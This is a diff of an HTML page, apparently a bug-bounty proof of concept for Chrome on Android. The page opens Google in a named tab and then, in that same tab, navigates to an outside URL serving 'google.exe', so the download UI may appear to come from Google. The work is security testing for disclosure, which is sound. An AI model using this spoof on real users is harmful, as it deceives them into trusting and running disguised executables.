@@ -3,48 +3,102 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Chrome Android Permission Navigation Test</title>
+  <title>Chrome Android Named-Tab Download Test</title>
+
+  <style>
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      padding: 24px;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+      background: #f3f5f7;
+      color: #202124;
+    }
+
+    main {
+      width: 100%;
+      max-width: 460px;
+      padding: 24px;
+      box-sizing: border-box;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 3px 16px #00000012;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      border: 0;
+      border-radius: 6px;
+      background: #188038;
+      color: white;
+      font-size: 16px;
+      font-weight: 600;
+    }
+
+    #log {
+      margin-top: 20px;
+      padding: 12px;
+      background: #f8f9fa;
+      border-radius: 6px;
+      white-space: pre-wrap;
+      overflow-wrap: anywhere;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+  </style>
 </head>
+
 <body>
-  <h2>Chrome Android Permission Test</h2>
-  <p>
-    Test whether a permission prompt remains visible across
-    navigation. Permission requests belong to the requesting origin.
-  </p>
-  <button id="start">Start Test</button>
-  <pre id="log">Ready.</pre>
+  <main>
+    <h2>Named-Tab Download Test</h2>
+
+    <p>
+      This test checks how Chrome for Android handles a named
+      browsing context followed by a download navigation.
+    </p>
+
+    <button id="start">Start Test</button>
+
+    <div id="log" aria-live="polite">Ready to test.</div>
+  </main>
 
   <script>
     const log = document.getElementById("log");
 
     function record(message) {
-      log.textContent +=
-        "\n[" + new Date().toLocaleTimeString() + "] " + message;
+      const time = new Date().toLocaleTimeString();
+      log.textContent += `\n[${time}] ${message}`;
     }
 
     document.getElementById("start").addEventListener("click", () => {
-      log.textContent = "Starting test...";
+      log.textContent = "Test started.";
 
-      const googleTab = window.open(
-        "https://www.google.com/",
-        "permission-test"
-      );
+      // Step 1: Open the genuine Google website.
+      const tab = window.open("https://google.com", "download-test");
 
-      if (!googleTab) {
-        record("Chrome blocked the Google tab.");
+      if (!tab) {
+        record("The browser blocked the new tab.");
         return;
       }
 
-      record("Google opened in the named tab.");
-      record("Wait 5 seconds, then open the controlled permission page.");
+      record("Requested Google in named browsing context.");
 
+      // Step 2: Wait, then navigate the same named context
+      // to a controlled test download endpoint.
       setTimeout(() => {
-        const permissionUrl =
-          new URL("permission.html", location.href).href;
+        record("Requesting navigation to the test download.");
 
-        window.open(permissionUrl, "_blank");
-        record("Permission page opened in a separate tab.");
-        record("Observe the permission prompt and address bar.");
+        window.open(
+          "https://bugbountychrome.github.io/spoof-dialog/google.exe",
+          "download-test"
+        );
+
+        record("Second navigation request issued.");
+        record("Observe the tab, address bar, and download UI.");
       }, 5000);
     });
   </script>
